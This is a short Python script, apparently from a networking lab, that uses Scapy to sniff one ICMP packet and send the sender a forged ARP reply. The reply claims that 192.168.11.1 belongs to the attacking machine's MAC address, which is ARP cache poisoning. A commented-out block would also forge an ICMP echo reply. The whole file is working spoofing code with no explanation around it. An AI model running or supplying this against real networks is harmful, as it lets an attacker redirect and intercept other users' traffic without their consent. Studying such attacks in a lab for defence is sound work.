#!/usr/bin/env python3

from scapy.all import *

def main():
    arp_update = Ether()/ARP()

    packets = sniff(filter="icmp", count = 1)
    packet = packets[0]

    arp_update[Ether].dst = packet[Ether].src
    arp_update[ARP].psrc = "192.168.11.1"
    arp_update[ARP].pdst = packet[IP].src

    sendp(arp_update)
    #print(arp_update.show())

    '''
    icmp_response = Ether()/IP()/ICMP()/Raw()
    icmp_response[Ether].src = packet[Ether].dst
    icmp_response[Ether].dst = packet[Ether].src
    icmp_response[IP].src = packet[IP].dst
    icmp_response[IP].dst = packet[IP].src
    icmp_response[IP].id = 0
    icmp_response[IP].len = 60
    icmp_response[ICMP].type = 0
    icmp_response[ICMP].seq = packet[ICMP].seq
    icmp_response[ICMP].id = 1
    icmp_response[Raw].load = packet[Raw].load

    sendp(icmp_response)
    '''

if __name__ == "__main__":
    main()
